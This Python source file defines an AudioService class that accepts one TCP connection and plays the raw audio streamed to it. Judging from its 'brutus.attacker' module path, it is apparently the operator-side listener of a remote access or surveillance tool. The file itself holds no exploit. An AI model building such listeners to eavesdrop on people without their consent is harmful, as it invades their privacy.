from brutus.attacker.service.service import Service

CHANNELS = 1
RATE = 44100
CHUNK = 4096


class AudioService(Service):
    """Accept one TCP connection and play incoming raw audio."""

    def __init__(self, host: str, port: int) -> None:
        super().__init__(host, port)
        self._pyaudio = None
        self._stream = None

    def _start_keyboard_listener(self) -> None:
        from pynput.keyboard import Key, Listener

        def on_press(key):
            if key == Key.esc:
                self.running = False
                return False

        Listener(on_press=on_press).start()

    def run(self) -> None:
        import pyaudio

        FORMAT = pyaudio.paInt16
        try:
            self.setup_socket()
            self.accept_connection()
            if not self.conn:
                return

            self._pyaudio = pyaudio.PyAudio()
            self._stream = self._pyaudio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                output=True,
                frames_per_buffer=CHUNK,
            )
            self._start_keyboard_listener()

            while self.running:
                try:
                    data = self.conn.recv(CHUNK)
                    if not data:
                        break
                    self._stream.write(data)
                except Exception:
                    break
        finally:
            for obj, method in [
                (self._stream, "stop_stream"),
                (self._stream, "close"),
            ]:
                if obj:
                    try:
                        getattr(obj, method)()
                    except Exception:
                        pass
            if self._pyaudio:
                try:
                    self._pyaudio.terminate()
                except Exception:
                    pass
